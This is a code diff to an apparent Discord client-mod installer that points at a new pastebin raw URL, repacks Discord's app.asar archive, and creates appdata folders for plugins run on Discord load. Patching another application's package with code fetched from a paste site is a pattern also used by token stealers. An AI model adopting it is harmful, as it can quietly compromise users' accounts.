@@ -1,4 +1,4 @@
-const url = 'https://pastebin.com/raw/F4snEiPR';
+const url = 'https://pastebin.com/raw/s919gMWV';
 const axios = require("axios");
 const child_process = require("child_process");
 const process = require("process");
@@ -24,8 +24,13 @@ const { join } = require('path');
         child_process.execSync('Del /f ' + path);
         child_process.execSync(`asar pack ${path.substring(0, path.length - 9) + "/_extracted"} ${path}`);
         fs.rmdirSync(path.substring(0, path.length - 9) + "\\_extracted", {recursive:true});
-        fs.mkdirSync(appdata + "/Discord_Bot");
-        console.log("Created the directory Discord_Bot in your appdata. You  can put your js files there to be executed on discord load. To load all new plugins please refresh discord doing ctrl + r");
+        fs.mkdir(appdata + "/Discord_Bot", {recursive: true}, (err) => {
+            if (err) return console.error(err);
+            fs.mkdirSync(appdata + "/Discord_Bot/Plugins");
+            fs.mkdirSync(appdata + "/Discord_Bot/Themes");
+
+        });
+        console.log("Created the directory Discord_Bot in your appdata. You  can put your js files in PLUGINS executed on discord load. To load all new plugins please refresh discord doing ctrl + r");
     }
 
 })();
